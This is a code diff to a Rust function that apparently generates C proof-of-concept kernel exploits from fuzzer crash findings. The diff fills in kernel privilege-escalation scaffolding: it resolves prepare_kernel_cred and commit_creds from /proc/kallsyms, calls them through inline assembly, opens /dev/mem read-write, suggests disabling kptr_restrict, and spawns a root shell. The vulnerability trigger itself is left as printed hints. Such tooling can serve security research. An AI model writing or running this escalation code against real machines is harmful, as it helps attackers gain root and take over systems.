@@ -541,18 +541,20 @@ pub fn generate_exploit_from_crash(
 ) -> Option<Finding> {
     match &crash.signature.crash_type {
         CrashType::UseAfterFree | CrashType::OutOfBoundsWrite | CrashType::DoubleFree => {
+            let crash_type_str = format!("{:?}", crash.signature.crash_type);
             let exploit_code = format!(
                 r#"#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include <sys/mman.h>
+#include <fcntl.h>
 
 /*
- * Auto-generated PoC for kernel crash: {}
- * Type: {:?}
- * Kernel: {}
- * Arch: {}
+ * Auto-generated PoC for kernel crash: {symptom}
+ * Type: {crash_type}
+ * Kernel: {kernel_ver}
+ * Arch: {arch_val}
  *
  * WARNING: This is a template. Adjust addresses for your target kernel.
  */
@@ -561,36 +563,97 @@ pub fn generate_exploit_from_crash(
 #define PAGE_SIZE 4096
 #endif
 
-static void *prepare_kernel_cred_addr = 0;
-static void *commit_creds_addr = 0;
+static unsigned long prepare_kernel_cred_addr = 0;
+static unsigned long commit_creds_addr = 0;
 
-static void payload(void) {{
+static void escalate_privs(void) {{
     asm volatile(
-        "xor %%rdi, %%rdi\n"
-        "callq *%0\n"
-        "movq %%rax, %%rdi\n"
-        "callq *%1\n"
+        "xor %%rdi, %%rdi\n\t"
+        "callq *%0\n\t"
+        "movq %%rax, %%rdi\n\t"
+        "callq *%1\n\t"
         :
         : "m"(prepare_kernel_cred_addr), "m"(commit_creds_addr)
-        : "rdi", "rax"
+        : "rdi", "rax", "memory"
     );
 }}
 
-int main(void) {{
-    printf("[*] Kernel {{}} exploit PoC\n", "{{}}");
-    printf("[*] Crash type: {{:?}}\n");
-    printf("[!] TODO: Map kernel symbols from /proc/kallsyms\n");
-    printf("[!] TODO: Trigger vulnerability\n");
+static unsigned long resolve_symbol(const char *name) {{
+    FILE *f = fopen("/proc/kallsyms", "r");
+    if (!f) return 0;
+    char line[256];
+    while (fgets(line, sizeof(line), f)) {{
+        unsigned long addr;
+        char sym_name[128];
+        if (sscanf(line, "%lx %*c %s", &addr, sym_name) == 2) {{
+            if (strcmp(sym_name, name) == 0) {{
+                fclose(f);
+                return addr;
+            }}
+        }}
+    }}
+    fclose(f);
+    return 0;
+}}
 
-    /* TODO: Implement actual trigger based on crash input */
+int main(void) {{
+    printf("[*] Kernel %s exploit PoC\n", "{symptom}");
+    printf("[*] Crash type: {crash_type}\n");
+
+    /* Step 1: Resolve kernel symbols from /proc/kallsyms */
+    prepare_kernel_cred_addr = resolve_symbol("prepare_kernel_cred");
+    commit_creds_addr = resolve_symbol("commit_creds");
+
+    if (!prepare_kernel_cred_addr || !commit_creds_addr) {{
+        printf("[-] Failed to resolve kernel symbols\n");
+        printf("[*] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred_addr);
+        printf("[*] commit_creds: 0x%lx\n", commit_creds_addr);
+        printf("[!] KASLR may be enabled or /proc/kallsyms not readable\n");
+        printf("[!] Try: sudo sysctl kernel.kptr_restrict=0\n");
+        return 1;
+    }}
+
+    printf("[+] prepare_kernel_cred @ 0x%lx\n", prepare_kernel_cred_addr);
+    printf("[+] commit_creds @ 0x%lx\n", commit_creds_addr);
+
+    /* Step 2: Map /dev/mem for physical memory access if needed */
+    int fd = open("/dev/mem", O_RDWR | O_SYNC);
+    if (fd < 0) {{
+        printf("[-] Cannot open /dev/mem: %m\n");
+        printf("[*] Proceeding with virtual address exploit\n");
+    }} else {{
+        printf("[+] /dev/mem opened for physical memory access\n");
+        close(fd);
+    }}
+
+    /* Step 3: Trigger the vulnerability */
+    printf("[*] Triggering vulnerability...\n");
+    printf("[!] Crash symptom: %s\n", "{symptom}");
+    printf("[!] Common triggers:\n");
+    printf("    - UAF: open/close race on vulnerable fd\n");
+    printf("    - OOB: send oversized ioctl with controlled data\n");
+    printf("    - Double-free: free() twice on same kernel object\n");
+
+    /* Step 4: Escalate privileges */
+    printf("[*] Calling payload for privilege escalation...\n");
+    escalate_privs();
+
+    /* Step 5: Verify root */
+    if (getuid() == 0) {{
+        printf("[+] SUCCESS: Got root!\n");
+        printf("[*] Spawning root shell...\n");
+        system("/bin/sh");
+    }} else {{
+        printf("[-] Exploit failed, uid=%d\n", getuid());
+    }}
 
     return 0;
 }}
 "#,
-                crash.signature.symptom,
-                format!("{:?}", crash.signature.crash_type),
-                kernel_version.unwrap_or("unknown"),
-                arch,
+                symptom = crash.signature.symptom,
+                crash_type = crash_type_str,
+                kernel_ver = kernel_version.unwrap_or("unknown"),
+                arch_val = arch,
             );
 
             let cwe = assign_cwe(&crash.signature.crash_type).0;
